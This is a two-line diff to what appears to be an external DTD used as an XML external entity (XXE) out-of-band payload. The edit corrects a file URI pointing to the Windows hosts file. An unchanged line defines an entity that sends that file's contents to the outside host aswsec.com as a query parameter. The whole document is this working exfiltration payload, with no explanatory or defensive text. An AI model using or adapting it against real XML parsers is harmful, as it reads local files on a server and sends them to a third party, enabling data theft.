@@ -1,2 +1,2 @@
-<!ENTITY % resource SYSTEM "file://C:\\windows\\system32\\drivers\\etc\\hosts">
+<!ENTITY % resource SYSTEM "file:///C:\\windows\\system32\\drivers\\etc\\hosts">
 <!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM 'https://aswsec.com?p=%resource;'>">
